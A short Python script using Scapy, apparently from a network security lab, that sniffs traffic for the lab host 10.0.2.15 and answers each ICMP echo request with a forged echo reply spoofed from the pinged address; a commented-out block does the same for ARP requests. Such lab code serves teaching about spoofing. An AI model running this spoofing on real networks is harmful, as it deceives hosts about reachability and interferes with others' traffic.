#!/usr/bin/python
from scapy.all import *

def print_pkt(pkt):
   #for p in pkt: print p[1][IP].src
   #pkt[0].show()
   
   #Type: 8  = echo request; 0 = echo reply
   if (pkt[0].haslayer(ICMP) and pkt[0][ICMP].type == 8):
      sniffed_ip = pkt[0][IP].dst
      print("Sniffed IP: " + sniffed_ip)
      a = IP()
      a.src = sniffed_ip  # spoof reply from this IP
      a.dst = '10.0.2.15' # IP we are snniffing andd sending spoofed echo reply 
      b = ICMP(type="echo-reply")
      p = a/b
      send(p)
#   else:
#      if (pkt[0].haslayer(ARP) and pkt[0][ARP].psrc == '10.0.2.15'):
#         sniffed_ip = pkt[0][ARP].pdst
#         print("Sniffed IP: " + sniffed_ip)
#         a = IP()
#         a.src = sniffed_ip
#         a.dst = '10.0.2.15'
#         b = ICMP(type="echo-reply")
#         p = a/b
#         send(p)

pkt = sniff(filter='host 10.0.2.15',prn=print_pkt)

